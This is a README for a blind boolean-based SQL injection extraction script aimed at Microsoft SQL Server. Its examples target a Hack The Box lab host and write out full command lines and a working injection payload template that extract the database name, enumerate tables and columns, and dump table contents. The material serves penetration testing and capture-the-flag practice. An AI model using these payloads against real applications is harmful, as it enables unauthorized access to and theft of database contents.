# blind_sql_extractor.py

The script exploits blind boolean-based injection vulnerabilities to extract db data.

It has been used and tested only with Microsoft SQL Server.

## Usage Examples 

The examples are based on [HTB's StreamIO](https://n-califano.github.io/htb-streamio).

<dl>
  <dt>Required</dt>
  <dd><code>-u <TARGET_URL></code>  Target URL</dd>
  <dd><code>-pt <PAYLOAD_TEMPLATE></code>  Payload Template</dd>
  <dd><code>-p <PARAMETER></code>  Parameter to inject</dd>
  <dd><code>--true-string <TRUE_STRING></code>  True String (the program determines if a response is 'true' checking if this string is present in the server response)</dd>
</dl>

```bash
# Extract db name
python blind_sql_extractor.py -q "DB_NAME()" -u "https://watch.streamio.htb/search.php" -pt "toy%' AND ASCII(SUBSTRING(({}),{},1))={} AND 'vdVq%'='vdVq" -p q --true-string Toy
```

⚠️ The `ASCII(SUBSTRING(({}),{},1))={}` part of the payload template is responsible for the extraction process and should always be present.

```bash
# Enumerate tables
python blind_sql_extractor.py -u "https://watch.streamio.htb/search.php" -pt "toy%' AND ASCII(SUBSTRING(({}),{},1))={} AND 'vdVq%'='vdVq" -p q --true-string Toy --enum-tables

# Enumerate columns
python blind_sql_extractor.py -u "https://watch.streamio.htb/search.php" -pt "toy%' AND ASCII(SUBSTRING(({}),{},1))={} AND 'vdVq%'='vdVq" -p q --true-string Toy --enum-columns -t <TABLE_NAME>

# Dump a table
python blind_sql_extractor.py -u "https://watch.streamio.htb/search.php" -pt "toy%' AND ASCII(SUBSTRING(({}),{},1))={} AND 'vdVq%'='vdVq" -p q --true-string Toy --dump-table -t <TABLE_NAME> -c <COMMA_SEPARATED_COLUMNS>
```

⚠️ Currently the 'dump table' feature works only if a `id` column is present in the table and it's provided with the `-c` parameter. The reason is that the program uses the values from the `id` column to uniquely identify the rows. A future development could be to allow the user to specify which column to use to uniquely identify rows instead of relying on `id` column in a hard-coded fashion.